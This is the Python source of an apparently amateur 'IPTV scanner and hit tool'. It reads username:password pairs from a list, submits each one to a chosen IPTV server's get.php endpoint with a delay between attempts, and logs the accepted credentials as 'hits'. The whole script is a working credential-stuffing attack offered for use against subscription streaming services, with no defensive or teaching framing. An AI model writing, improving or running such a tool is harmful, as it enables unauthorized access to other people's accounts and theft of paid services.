#This is IPTV SCANNER and HIT TOOL. This tool is developed by Shamika Chathuranga(SCDEV).
#This is Source Code Of SCDEV'S IPTV SCANNER VERSION 1.0.


#Import Modules ------------------------------------------------------------------------------------------

import time
import requests
from colorama import Fore, Back, Style



#Console GUI ---------------------------------------------------------------------------------------------

print(Fore.LIGHTYELLOW_EX+"="*130)
print(" "*100)
print(Fore.LIGHTGREEN_EX+"="*42+"  🆂 🅲 🅳 🅴 🆅 ' 🆂   🅸 🅿 🆃 🆅   🆂 🅲 🅰 🅽 🅽 🅴 🆁   "+"="*44)
print(" "*53+"(Shamika Chathuranga)")
print(Fore.GREEN+" "*62+"1.0ᴠ")
print(Fore.LIGHTYELLOW_EX+"="*130)
print("   "*150)



#Getting User Input Server -------------------------------------------------------------------------------

URL=input(Fore.LIGHTBLUE_EX+"Enter Server URL (starshare.live:8080): ")
print(" "*150)



#Open Username:Password List ----------------------------------------------------------------------------

with open('users.txt', 'r') as data:
  for line in data:
    
     parts = line.strip().split(':')
    
     username, password = parts[0], parts[1]


     time.sleep(6)  
     PARAMS = {'username':username ,'password':password , 'type': "m3u"} 



#Sending http Requests -----------------------------------------------------------------------------------

     response = requests.get('http://'+URL+'/get.php',params=PARAMS)




#Getting Data from url -----------------------------------------------------------------------------------    
    
     if response.status_code==200:
        with open("hits.txt", "w") as f:
          f.write("Active: "+response.url)   
          print(Fore.LIGHTGREEN_EX+str(response.status_code)+"Active,  SUCCESSFUL HIT: "+response.url)
     else:
         print(Fore.RED+str(response.status_code)+"Not Active,  UNSUCCESSFUL HIT: "+response.url)
     
    



